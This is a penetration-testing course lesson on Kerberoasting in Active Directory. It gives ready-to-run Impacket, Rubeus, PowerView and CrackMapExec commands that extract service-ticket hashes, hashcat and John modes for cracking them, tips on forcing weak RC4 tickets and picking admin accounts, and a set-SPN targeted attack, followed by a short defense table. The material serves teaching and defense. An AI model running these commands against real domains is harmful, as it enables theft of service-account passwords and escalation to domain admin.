# Kerberoasting

## Unit 4 - Topic 4 | Credential Attacks

---

## Overview

**Kerberoasting** requests Kerberos TGS tickets for service accounts with SPNs (Service Principal Names), then cracks the ticket's encrypted portion offline to recover the service account's plaintext password. It's one of the most reliable AD attacks — any authenticated domain user can perform it.

---

## 1. How Kerberoasting Works

```
KERBEROASTING ATTACK FLOW:

1. IDENTIFY SERVICE ACCOUNTS WITH SPNs
   ┌──────────┐    LDAP Query: (servicePrincipalName=*)    ┌──────┐
   │ Attacker │ ─────────────────────────────────────────→ │  DC  │
   │ (any     │    Results: svc_sql, svc_web, svc_backup   │      │
   │  domain  │ ←───────────────────────────────────────── │      │
   │  user)   │                                            │      │
   └──────────┘                                            └──────┘

2. REQUEST TGS FOR TARGET SERVICE
   ┌──────────┐    TGS-REQ for MSSQLSvc/sql01:1433         ┌──────┐
   │ Attacker │ ─────────────────────────────────────────→ │  KDC │
   │          │    TGS-REP (encrypted with svc_sql hash)   │      │
   │          │ ←───────────────────────────────────────── │      │
   └──────────┘                                            └──────┘
   
   The TGS ticket is encrypted with the SERVICE ACCOUNT's
   password hash. KDC gives this to ANY authenticated user!

3. CRACK THE TICKET OFFLINE
   ┌──────────┐
   │ Attacker │ → hashcat -m 13100 tgs_hashes.txt wordlist
   │          │ → Cracks the encryption key = SERVICE PASSWORD!
   └──────────┘
   
   No network traffic, no failed logons, no lockouts!
```

---

## 2. Performing Kerberoasting

```bash
# === FROM LINUX (Impacket) ===
# Find and roast all service accounts:
GetUserSPNs.py corp.local/user:pass -dc-ip dc01 -request
# -request: Actually request the TGS tickets
# Output: hashcat-format hashes

# Target specific user:
GetUserSPNs.py corp.local/user:pass -dc-ip dc01 \
  -request-user svc_sql

# With NTLM hash:
GetUserSPNs.py corp.local/user -hashes :NTLM_HASH \
  -dc-ip dc01 -request

# === FROM WINDOWS (Rubeus — Preferred) ===
.\Rubeus.exe kerberoast /outfile:hashes.txt
# Automatically finds and roasts all SPN accounts

# Target specific user:
.\Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# Request RC4 encryption (easier to crack):
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
# /tgtdeleg: Force RC4 encryption even if AES is default

# === FROM WINDOWS (PowerView + Invoke-Kerberoast) ===
Import-Module .\PowerView.ps1
Invoke-Kerberoast | fl
# Or with hashcat output:
Invoke-Kerberoast -OutputFormat hashcat | \
  Select-Object -ExpandProperty Hash | Out-File hashes.txt

# === CRACKMAPEXEC ===
crackmapexec ldap dc01 -u user -p pass --kerberoasting output.txt
```

---

## 3. Cracking Kerberoast Hashes

```bash
# === HASH FORMAT ===
# $krb5tgs$23$*svc_sql$CORP.LOCAL$corp.local/svc_sql*$...

# === HASHCAT (GPU — Fastest) ===
# RC4 encrypted tickets:
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# With rules:
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES-256 encrypted tickets (slower to crack):
hashcat -m 19700 kerberoast_hashes.txt rockyou.txt

# AES-128:
hashcat -m 19600 kerberoast_hashes.txt rockyou.txt

# === JOHN THE RIPPER ===
john --format=krb5tgs kerberoast_hashes.txt \
  --wordlist=rockyou.txt

# === CRACKING SPEEDS (Approximate) ===
# RC4  (etype 23): ~200 GH/s (very fast)
# AES-128 (etype 17): ~200 MH/s (1000x slower)
# AES-256 (etype 18): ~100 MH/s (2000x slower)
# Conclusion: Always try to get RC4 tickets!
```

---

## 4. Targeted Kerberoasting

```bash
# === HIGH-VALUE TARGETS ===
# Not all service accounts are equal!

# Priority targets:
# 1. Service accounts that are members of Domain Admins
# 2. Service accounts with adminCount=1
# 3. Accounts with old passwords (pwdLastSet)
# 4. Accounts with descriptions containing hints

# Find high-value SPN accounts:
Get-DomainUser -SPN | select samaccountname, \
  memberof, pwdlastset, description, admincount

# From BloodHound:
# Query: "List all Kerberoastable Accounts"
# Then: "Shortest Path from Kerberoastable Users to DA"

# === SET SPN ATTACK (Targeted Kerberoasting) ===
# If you have write access to a user object (GenericAll/Write):
# You can SET an SPN on any user, then Kerberoast them!

# Set SPN on target user:
Set-DomainObject -Identity target_user \
  -SET @{serviceprincipalname='nonexistent/blah'}

# Kerberoast the target:
.\Rubeus.exe kerberoast /user:target_user

# Clean up (remove the SPN):
Set-DomainObject -Identity target_user \
  -Clear serviceprincipalname
```

---

## 5. Defense Against Kerberoasting

| Defense | Implementation |
|---------|---------------|
| **Strong passwords** | 25+ character passwords for service accounts |
| **gMSA** | Group Managed Service Accounts (auto-rotating 120-char passwords) |
| **AES encryption** | Disable RC4 for service accounts |
| **Minimize SPNs** | Remove unnecessary SPNs |
| **Monitor** | Detect bulk TGS requests (Event ID 4769) |
| **Regular rotation** | Change service account passwords regularly |
| **Honey accounts** | Service account SPNs that trigger alerts when roasted |

```powershell
# Create a gMSA (Group Managed Service Account):
New-ADServiceAccount -Name "gMSA_SQL" \
  -DNSHostName "gmsa_sql.corp.local" \
  -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers"
# Password: 120 characters, auto-rotated every 30 days
# Cannot be Kerberoasted (password too complex)
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **Kerberoasting** | Crack TGS tickets for service account passwords |
| **Requirement** | Any authenticated domain user |
| **Tool (Linux)** | GetUserSPNs.py from Impacket |
| **Tool (Windows)** | Rubeus kerberoast |
| **Hashcat mode** | -m 13100 (RC4) or -m 19700 (AES-256) |
| **Best defense** | gMSA (auto-rotating 120-char passwords) |

---

## Quick Revision Questions

1. **Why can any domain user perform Kerberoasting?**
2. **What encryption type is easiest to crack?**
3. **How do you force RC4 tickets with Rubeus?**
4. **What is a gMSA and how does it prevent Kerberoasting?**
5. **What is targeted Kerberoasting (Set-SPN attack)?**

---

[← Previous: Pass-the-Ticket](03-pass-the-ticket.md) | [Next: Silver and Golden Tickets →](05-silver-and-golden-tickets.md)

---

*Unit 4 - Topic 4 of 6 | [Back to README](../README.md)*
